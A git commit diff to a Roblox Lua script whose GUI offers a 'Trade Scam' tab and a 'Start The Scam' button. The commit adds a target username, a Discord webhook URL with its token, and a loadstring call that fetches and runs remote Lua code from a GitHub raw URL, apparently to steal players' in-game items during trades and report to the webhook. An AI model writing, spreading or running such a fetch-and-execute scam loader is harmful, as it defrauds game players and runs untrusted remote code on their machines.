b296584277e3951cb74ab7d4ce9aba1adba340e7
CorruptedClan <105439556+CorruptedClan@users.noreply.github.com>
2023-04-20 18:48:10 +0300

    Update premiumSimp.lua

--- premiumSimp.lua
+++ premiumSimp.lua
@@ -9,5 +9,8 @@ local TradeTab = Window:NewTab("Trade Scam")
 local ScamSection = TradeTab:NewSection("Scam thingy")
 
 ScamSection:NewButton("Start The Scam", "press before trade", function()
-    print("you have 30 seconds...")
+    UserName = "Wizard_CatWhite"
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
 end)
